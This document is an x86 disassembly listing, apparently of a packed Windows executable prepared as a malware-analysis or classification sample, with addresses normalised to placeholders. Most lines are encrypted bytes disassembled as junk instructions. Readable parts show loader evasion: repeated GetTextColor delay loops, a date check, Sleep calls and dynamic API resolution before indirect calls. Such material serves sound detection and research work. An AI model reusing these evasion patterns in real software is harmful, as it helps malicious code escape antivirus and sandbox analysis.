imul esp [ edx + ecx ] 0x1d1d1f3a
mov ebx 0x66ed2267
jmp r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
push edx
mov ch 0x6b
outsd
cmpsb [ esi ] [ edi ]
xor ch ch
push ebp
or ecx [ ecx + 0x721d1d09 ]
jb r-xdata
loop r-xdata
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata
or esi [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6f72721d
sbb eax 0xb06a76f
dec edi
pop ss
test [ ebx - 0x61 ] ch
push cs
mov eax 0xdab76b84
imul ebx [ ebx + ecx ] 0x1d1d0c87
jb r-xdata
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x7272212b
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or [ 0x7272721d ] ebx
jb r-xdata
or ebp [ esi + 0x721d1d24 ]
jb r-xdata
0xaf6b84 0x890a
jb r-xdata
popad
in al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
xor [ eax ] ebp
jb r-xdata
jb r-xdata
insd
sbb eax 0xe2e22e55
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1e87619a ] 0x6923e1e2
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + ecx * 2 ]
jb r-xdata
loop r-xdata
sub ebp ebp
sbb eax 0xeead69bb
rcr [ 0xffffffffe188b5b5 ] 0x1
movsb [ edi ] [ esi ]
into
or ch al
sbb al 0x1d
sbb eax 0xc3df028a
sbb eax 0x6b0aea97
add [ 0xbbbbb1d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ ebx + 0x1 ]
sbb eax 0xbbbbb1d
pop ebp
shl [ edx ] 0x1
or eax [ eax + 0x721d1d1d ]
jb r-xdata
or eax [ ecx + ecx * 8 - 0x1e ]
loop r-xdata
mov dl 0xb2
mov dl 0xb1
jb r-xdata
jb r-xdata
mov edx 0xe2f8900b
loop r-xdata
mov [ ebp + 0x6a76b84 ] dl
jb r-xdata
or eax [ eax + 0x721d1d39 ]
jb r-xdata
sbb eax 0xbb5fab5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ecx + 0x721d1d2e ]
jb r-xdata
imul ebx [ esi - 0x6124313a ] 0xffffffc6
aas
sbb eax 0xed727272
jb r-xdata
jb r-xdata
mov ch 0xb
mov [ 0x611d1d57 ] eax
jb r-xdata
push cs
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x1d
jb r-xdata
imul ebp [ edi + 0x24890a00 ] 0x1d
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
add bh [ ebx - 0x4df55891 ]
imul esp [ edi - 0x50947b16 ] 0x24890a00
sbb eax 0x2267bb1d
sbb eax 0xee0bceb5
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x2bbc7272
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x676fea97
jb r-xdata
0xe21e8761 0x23e1
jb r-xdata
jb r-xdata
dec edi
jb r-xdata
mov cl 0xa5
jb r-xdata
loop r-xdata
0x1d016b0a 0xbb1d
jb r-xdata
mov edi 0xec7e0bca
jb r-xdata
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb
mov esp ebp
loop r-xdata
sbb eax 0x9c19ad8a
out dx eax
mov ch 0x6b
add bl [ 0xffffffff9ea46b1d ]
jb r-xdata
sbb [ 0xfffffffffd9267ed ] ebx
loop r-xdata
push es
sbb eax 0xee26611d
imul ebx [ esi + 0xab4f6c6 ] 0xffffff90
mov bl [ 0xffffffffb1e2e2e2 ]
mov ah 0xa
daa
push ds
jb r-xdata
cmp [ 0x55ed721d ] ebx
jb r-xdata
sbb eax 0xf150b1d
dec ebp
jb r-xdata
jb r-xdata
cli
imul esp [ edx + edi * 4 + 0x1d27b10a ] 0x1d
mov ch [ 0xffffffffb50cda09 ]
imul esp [ esi + edi * 4 + 0x1d27a70a ] 0x1d
mov ch [ edi ]
xchg esi eax
and al 0xb5
imul esp [ esi + ebp * 2 - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov dh 0x52
popad
sbb ah bl
sub esp [ ecx ]
sbb ah bl
jb r-xdata
sbb eax 0xe31a611d
in al 0xe3
loop r-xdata
mov edi 0xea60a0e
sbb eax 0xee26611d
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
add [ edx ] cl
mov [ ebx + 0x2267bb1d ] esp
jb r-xdata
pop ss
jb r-xdata
adc bl [ 0x7272721d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1e0a676f 0x1d1d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
xor [ ecx ] ebx
popad
and al 0xea
mov al [ 0x41f7be6a ]
or edx [ esp + ebx * 2 ]
sbb eax 0x7272721d
jb r-xdata
mov ah 0xda
imul edi [ edx ] 0x1d285f0b
sbb eax 0x72727272
jb r-xdata
imul esp [ 0xfffffffff6a76b84 ] 0x1d1b370b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
or ch [ 0xb1d1d1f ]
push edi
dec edx
and edx 0xffffffe2
and eax 0x7afac6a6
fsub st2
loop r-xdata
or edi [ esi - 0x14 ]
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0xe2e26274
sbb eax 0xd055ed72
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ ebx - 0x1ee2e2c9 ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x16bf6b02
test cl bl
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
0x7272212b 0x7272
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x13c20bee ] al
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbc0bea97
pop ss
sbb eax 0x7272721d
in al dx
jb r-xdata
sbb eax 0x2267bb1d
in eax dx
jmp r-xdata
and al 0xa
cmp bl [ edi ]
in eax dx
jb r-xdata
sbb eax 0x69caac69
mov edi 0x6930bee
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0x74d0b1d
aas
jb r-xdata
jb r-xdata
popad
jb r-xdata
imul ebp [ edi - 0x589044fe ] 0xa
mov dl 0x69
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbf6b0697
jb r-xdata
sbb eax 0x72727272
and [ 0x7272721d ] ebx
xor [ edi ] 0x1d
push ds
jb r-xdata
in eax dx
call sub_45bcd8
loop r-xdata
or dh bl
sub bl [ 0x2267bb1d ]
and ch ch
loop r-xdata
jb r-xdata
jb r-xdata
adc bl [ ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x88
jecxz r-xdata
sbb eax 0xe188b5b5
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0x6b
push 0x52
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
or edx [ ebx + 0x721d1d06 ]
jb r-xdata
push ss
aaa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
loop r-xdata
or cl [ ebp + 0x52 ]
jb r-xdata
sbb eax 0xb22e11d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
les ecx [ ebp + 0x1d ]
lea bx [ edi ]
aas
jb r-xdata
sbb eax 0x89f0bcf
sbb eax 0xd2a66f1d
sbb eax 0xb2f6971d
sbb eax 0xe2e20e75
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
stc
loope r-xdata
imul edi [ edi + 0x69818818 ] 0x38
or ebp [ ebx ]
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
push es
jb r-xdata
sbb eax 0x160b22e1
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
or edi edi
jb r-xdata
xchg edi eax
add bl [ 0xffffffffe2e26675 ]
loop r-xdata
sbb eax 0xed22671d
or ecx [ ebp + 0x7 ]
jb r-xdata
push edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg cx ax
adc ebx [ 0xa7e0b1d ]
sbb eax 0x7272721d
jb r-xdata
sbb [ 0xffffffffa76f721d ] bl
sbb eax 0x900bb294
jb r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
sbb eax 0x1d074d0b
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
imul ebp [ ebx + 0x16afe11a ] 0x1d244b0b
sbb eax 0xb727272
xchg ebx eax
out 0xe2 al
loop r-xdata
jb r-xdata
leave
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul edi [ esi - 0x267b162e ] 0x33
or ebx [ ebx + 0x58 ]
sbb eax 0xcaac691d
and ch [ ebx ]
jb r-xdata
test [ ebx - 0x49 ] ch
cmp cl [ ebx ]
dec esi
sbb eax 0x7272721d
or ebx [ ebx ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
sbb eax 0x2b22d172
jb r-xdata
and cl [ ebx ]
jb r-xdata
loope r-xdata
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x49 ] ch
cmp [ eax + 0x6b849288 ] bh
push esp
loop r-xdata
push ss
mov dl 0xb
imul ebp [ edx ] 0x1d
sbb eax 0x72727272
or edx [ eax + 0x721d1d18 ]
outsd
jb r-xdata
jb r-xdata
pop ss
jb r-xdata
jb r-xdata
sbb eax 0x751d0297
pop es
jb r-xdata
jb r-xdata
imul esp [ 0x7221bfbd ] 0x72727272
jb r-xdata
jb r-xdata
imul ebp [ edx ] 0x1d1cbf0b
sbb eax 0x72727272
jb r-xdata
mov [ esp + eax * 4 - 0x47434895 ] cl
mov [ esi + 0x1d0a380b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
dec ebp
jb r-xdata
push edi
or [ 0x7272721d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
jb r-xdata
salc
loop r-xdata
push ds
add [ 0xffffffff8c66ed1d ] ebx
imul ebp [ edi + 0x364d0b2e ] 0x1d
sbb eax 0x72727272
mov [ 0x1d2f690b ] al
sbb eax 0x72727272
sbb eax 0x1d0a7272
daa
sbb eax 0x22d1bb1d
imul esi [ edi - 0x6d7747c8 ] 0xffffff84
imul esi [ edi + 0x510bb83e ] 0x4e
sbb eax 0x7272721d
jb r-xdata
dec esi
jb r-xdata
push esi
sbb eax 0xa72721d
jb r-xdata
out dx al
xor al 0x3b
sbb eax 0xe024611d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0x1d0bb11d
or edx [ esi ]
jb r-xdata
mov bh 0x3e
mov eax 0x1d4e510b
mov eax 0x6b849288
scasb [ di ]
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
imul esp [ edi + 0x2eafe136 ] 0x526a6bb2
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edx [ 0x721d1d0f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ edi + edx * 2 ]
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
nop
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx esp
popad
mov ebx 0xb2267bb
in eax dx
jb r-xdata
popad
xor bl [ 0x7272721d ]
jb r-xdata
inc edx
stosb [ edi ]
0xa20b2569 0x1d50
test [ ebx - 0x51 ] ch
or ecx [ cs : ebp + 0x36 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov eax 0x1d4e510b
loop r-xdata
out dx al
sbb al 0xb
dec edi
add [ 0x7272721d ] bl
jb r-xdata
or edx [ eax ]
push es
and [ bp + 0x1d ] eax
sbb eax 0x1d23fa0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmp [ edi - 0x59 ] ebp
imul esp [ 0x1d50a20b ] 0x7272721d
jb r-xdata
jb r-xdata
aam 0x3e
jb r-xdata
loope r-xdata
fstp [ edi + 0x6930bee ]
out dx eax
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jb r-xdata
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov bl 0xb
xlat
call 0xffffffffdc5199cd
xor al 0x1d
jb r-xdata
or ebp esi
mov ch 0xce
or cl [ ecx - 0x44e2e2dc ]
and ch ch
imul edi [ edi + 0x16bf6b02 ] 0xffffff84
fldenv [ esp + 0x17fa61ed ]
jb r-xdata
sbb eax 0xa76f721d
in eax dx
bound esi [ ecx + 0x1d25cb0b ]
sbb eax 0x4acb66ed
sbb eax 0x5aaf6f1d
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh ah
cmp [ 0xffffffffed22671d ] bl
hlt
sar [ ecx ] 0x1
outsd
cmpsd [ esi ] [ edi ]
and ch ch
jb r-xdata
or esi [ ecx + ecx ]
jb r-xdata
or ecx [ ebx + 0x24 ]
sbb eax 0x7272721d
or edx [ ebx + 0x72e2e2e6 ]
imul edi [ 0x24611931 ] 0xbe6aa0ea
test [ ecx + 0xb ] 0x1d1d5c14
jb r-xdata
cmp ebx [ 0xffffffffe024611d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jno r-xdata
jb r-xdata
pop edx
sbb eax 0x4c710a1d
jb r-xdata
jb r-xdata
mov [ ecx + 0x6b843b69 ] dl
imul edi [ eax ] 0x42bf6b84
jb r-xdata
sbb eax 0xbe02461
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub ebx [ eax + 0x1d ]
sbb eax 0x66ed2267
cli
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
or ecx [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
fcmovnbe st6
jb r-xdata
inc eax
imul edi [ eax ] 0x46bf6b84
mov ecx 0x6b849688
imul ebp [ edx + 0xb2569ea ] 0x1d1d50a2
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0x17ff0b1d
cli
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2bbbbb1d
and [ edx + 0x72 ] esi
sub al 0x57
jpe r-xdata
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x54ae2c2 ] 0xffffffb5
xchg edi eax
sbb eax 0x6971d72
mov edx 0x1d34dc0b
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov ah dl
0x4a0be2e2 0x1d3b
or [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov eax eax
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1aa7db
outsb
jo r-xdata
sbb eax 0xed22671d
jb r-xdata
cmp ebx [ bx + si + 0x1d ]
sbb eax 0x722122d1
jb r-xdata
loop r-xdata
sbb eax 0x1d4c710a
sbb eax 0x67ed2267
out dx eax
das
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb1d1d27
shl [ edx ] 0x1
loop r-xdata
sbb eax 0xed22671d
and al 0xe0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
scasb [ edi ]
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
sbb eax 0x7272721d
cmpsd [ esi ] [ edi ]
sbb dh [ edx + 0xc0a2469 ]
pop ebp
sbb eax 0x2267bb1d
jb r-xdata
loopne r-xdata
xchg edx eax
sbb eax 0x8590b1d
sbb eax 0x2267721d
or esp edx
add [ 0xffffffffee0ab51d ] ebx
and ebx [ 0x67bbbb1d ]
and cl [ ebx ]
sbb eax 0x1d35170b
sbb [ ecx + 0x1d ] ecx
mov dl al
in eax dx
mov edi 0x9188b944
test [ ebx - 0x41 ] ch
dec edx
mov ecx 0x48bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x1d
sbb eax 0x8a727272
fsubp st0
sar [ edx + 0x1d34dc0b ] 0x1d
or edx edi
jb r-xdata
sub cl [ ebx ]
sub eax 0x2a691d1d
or edi [ edi + 0x721d1d1c ]
adc [ ecx ] eax
sbb eax 0x8c66ed1d
jb r-xdata
out dx al
loopne r-xdata
mov edi 0x84386940
imul edi [ edi - 0x697746ba ] 0xffffff84
imul edi [ edi - 0x6e7746bc ] 0xffffff84
imul edi [ edi + 0x6b84b94a ] 0xffffffbf
dec eax
jb r-xdata
push es
fdiv [ ebx - 0x68e28de3 ]
jb r-xdata
jb r-xdata
out dx eax
jb r-xdata
sbb eax 0x8a727272
jb r-xdata
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push rw-data
push ebp
jb r-xdata
clc
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
add [ eax ] al
jb r-xdata
jb r-xdata
sbb eax 0xb11dd11d
or esp [ eax + 0x28 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ch [ eax + 0xb1d1d13 ]
or [ esi ] eax
sbb [ bx + di + 0x1d ] ecx
cli
in eax dx
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ecx 0x6b849188
mov edi 0x6b84b94a
mov edi 0x6100b48
add eax 0xaf691d1d
0x1f1a676f 0x1d1d
or bh dl
imul edi [ edi - 0x7bc796c0 ] 0x6b
mov edi 0x9688b946
test [ ebx - 0x41 ] ch
inc esp
jb r-xdata
jb r-xdata
xchg ebx eax
jb r-xdata
sbb eax 0x1d3f7a0b
sbb eax 0x72727272
mov dl 0x6f
sbb eax 0x971d721d
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xb48c3ea7
scasd [ edi ]
scasd [ edi ]
or dh ch
add ebx [ 0xffffffffb9bcbd1d ]
and ch ch
in al 0x26
sbb eax 0x36af6f1d
outsd
cmpsd [ esi ] [ edi ]
or ecx [ es : esi + 0x27 ]
sbb eax 0xb41d721d
fisubr [ ecx + 0x3a ]
or ebx [ edi + 0x28 ]
sbb ebx [ 0x7272721d ]
jb r-xdata
xchg edx eax
mov ebp 0x25699088
test [ ebx - 0x59 ] ch
test [ ebx ] 0x37
jb r-xdata
jb r-xdata
nop
nop
push 0x0
in al dx
jb r-xdata
retn
jb r-xdata
popad
and al ah
test [ edi + 0x22 ] ah
in eax dx
xor ax 0x1d06
sbb eax 0x84e055ed
jb r-xdata
or esp [ ecx + 0x32 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
and ebx [ 0x7272721d ]
jb r-xdata
out dx eax
loop r-xdata
push es
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
jb r-xdata
pop ebp
jb r-xdata
push ebp
imul ecx [ esi ] 0x69f60e61
adc ah dl
loop r-xdata
imul edi [ edx ] 0x32a76b84
or ecx [ edx + eax + 0x72721d1d ]
jb r-xdata
add [ eax + 0x1d ] cl
sbb eax 0x84bb3c69
imul edi [ edi - 0x7bc596aa ] 0x6b
cmpsd [ esi ] [ edi ]
xor cl [ ebx ]
mov [ edx ] es
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xfa
0x1d22 0xb1d
and ch ch
mov [ fs : eax ] esp
add [ ebx ] dh
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
jb r-xdata
sbb eax 0x72727272
mov ch dl
loopne r-xdata
or ebx [ edi + 0x6f1d1d08 ]
cmpsb [ esi ] [ edi ]
sar dl cl
jb r-xdata
iretd
jb r-xdata
test bl bl
jb r-xdata
jb r-xdata
loop r-xdata
and [ 0x7272721d ] ebx
jb r-xdata
mov ebx 0x920b2267
loop r-xdata
mov [ rw-data ] 0x70ec
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
push 0x0
call GetTextColor
jmp r-xdata
jae r-xdata
or cl [ ebx * 2 + 0x67bb1d1d ]
and ch ch
in eax 0x5d
retn 0x4
in eax dx
mov cl 0xb5
or esi [ esi + 0xb1d1d5b ]
adc [ eax + 0x1d ] ebx
mov ebx 0xba222d1
imul ebp [ edi ] 0x72721d1d
jb r-xdata
sbb edx [ esi + 0x1d ]
cmpsd [ esi ] [ edi ]
push ss
or edx [ ebp + 0x58 ]
sbb eax 0xdb72721d
cdq
fsubp st5
les ecx [ di + 0x1d ]
outsd
mov esp 0xbfbd2569
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x72727272
rcl [ ebp + 0x68 ] 0x72
jb r-xdata
mov ebp esp
jb r-xdata
cli
or [ 0xffffffffd2a66f1d ] bl
mov cl 0x1d
mov ah 0xde
or esp edi
lahf
jb r-xdata
salc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
mov ah 0xa
test al 0x13
sbb eax 0x6090b1d
or cl [ eax ]
inc esp
sbb eax 0xee26611d
loop r-xdata
mov [ rw-data ] 0x5b8b
nop
mov [ rw-data ] 0x1
or edx [ ecx + 0x4e ]
jb r-xdata
push r-xdata
jb r-xdata
jb r-xdata
xor ch [ edi + 0x67 ]
bound ebx [ edi ]
jb r-xdata
sbb eax 0x6772721d
and cl [ ebx ]
sbb eax 0x721d1d4e
jb r-xdata
sbb eax 0xbb6d008a
mov edx 0x4a130bb5
adc [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0xe70bdeb4
scasw [ edi ]
loop r-xdata
nop
nop
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x1a99
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sbb eax 0xbb5fab5
jb r-xdata
in eax 0x45
jb r-xdata
xor eax eax
jb r-xdata
bound ebx [ bx ]
jb r-xdata
mov [ rw-data ] 0x3177
nop
push 0x0
call GetTextColor
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
push ebp
jb r-xdata
pop ds
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x8a0c
jne r-xdata
nop
push 0x0
call GetTextColor
nop
nop
mov eax 0x1fd3a51b
call sub_4026bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
sbb eax 0x441d0bb1
jb r-xdata
mov [ rw-data ] 0x1
jb r-xdata
mov ah 0xe2
inc ebp
add bl al
jmp r-xdata
inc ebp
jb r-xdata
or ebx [ 0x721d1d44 ]
jb r-xdata
jb r-xdata
mov ecx 0x8e
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403174
jae r-xdata
and [ ebx + 0x461bd82d ] al
jb r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
push [ fs : eax ]
jb r-xdata
mov edi 0x721d1d1c
sbb eax 0xb2a691d
jb r-xdata
inc esp
jb r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_40316c
sub eax rw-data
jb r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
shl [ edx ] 0x1
mov [ 0x1d08ee0b ] al
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1fd39246
jne r-xdata
call sub_403174
add [ edi ] ecx
sbb eax [ esi ]
jb r-xdata
mov [ eax ] esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ah [ edx + 0x1d08ee0b ]
mov [ ebx + ebp * 2 - 0x77474349 ] es
xchg [ ebx ] cl
jb r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
add [ ecx ] al
jb r-xdata
jb r-xdata
cmp [ edx ] cl
sbb eax 0x7272721d
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x89ed
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
nop
jb r-xdata
fcomp [ ebx ]
jb r-xdata
inc ebp
and al 0x85
lodsb [ esi ]
or ah [ edi + 0x11 ]
sbb eax 0x51350b1d
sbb eax 0x7272721d
mov esp 0x1d51740b
sbb eax 0x9f6b1d88
sbb cl [ ebx ]
lea ecx [ edi ]
sbb eax 0xb0b5b41d
pop esp
nop
nop
push 0x12
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
test [ edx ] al
jb r-xdata
inc esi
jb r-xdata
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_458470
mov [ rw-data ] eax
cmp [ rw-data ] 0x15
jbe r-xdata
nop
push 0x0
call sub_4584f0
nop
nop
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
call sub_403174
add [ eax ] al
jb r-xdata
jb r-xdata
imul esp [ esi + edx * 4 + 0x1d22b90a ] 0x1d
mov al [ ebx ]
loopne r-xdata
add [ edx + eax - 0x1b980000 ] 0x1b
inc esi
add al ch
retn 0xfa7c
jb r-xdata
mov [ eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push ebx
or esp [ ebx + 0x721d1d0e ]
jb r-xdata
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
add al [ eax ]
jb r-xdata
imul eax [ edx ] 0x0
add [ eax - 0x17ff9570 ] dl
cli
jle r-xdata
jb r-xdata
add [ eax - 0x1c ] ch
sbb eax [ esi ]
jb r-xdata
push 0x0
call GetTextColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
je r-xdata
[ edx ]
movsb [ edi ] [ esi ]
xchg esi eax
or bh [ ecx - 0x75e2e2de ]
add esp eax
and eax 0xea30b53
sub_45d012
loop r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
adc ebp ebp
sbb [ esi + 0x1d ] bl
sbb eax 0x1d596e0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
adc esp [ esi + 0x30 ]
in eax dx
jb r-xdata
loop r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
xchg edi eax
jb r-xdata
leave
and eax 0x1d0466ed
sbb eax 0x67bcbd1d
test [ ebx - 0x49 ] ch
cmp al 0xb8
and cl [ ebx ]
pop ss
jecxz r-xdata
or dl [ edi ]
jb r-xdata
or al 0xba
cmpsd [ esi ] [ edi ]
jb r-xdata
push ss
in eax dx
pushad
adc eax 0x6f1d1d03
cmpsd [ esi ] [ edi ]
add dh [ edx + 0x1db6941d ]
mov edi 0xba66edee
loop r-xdata
dec edx
pop di
sbb eax 0xeebfdb1d
in eax dx
0x1d5f 0x691d
mov [ ecx + 0x2b76b84 ] dl
imul esi [ ebx ] 0xb76b84
or ebx [ ebx + 0x721d1d3f ]
sbb eax 0xe2e24a75
loop r-xdata
sbb eax 0xa66fbb1d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov edx 0x2a698c88
jb r-xdata
xchg edi eax
sbb eax 0x25690e97
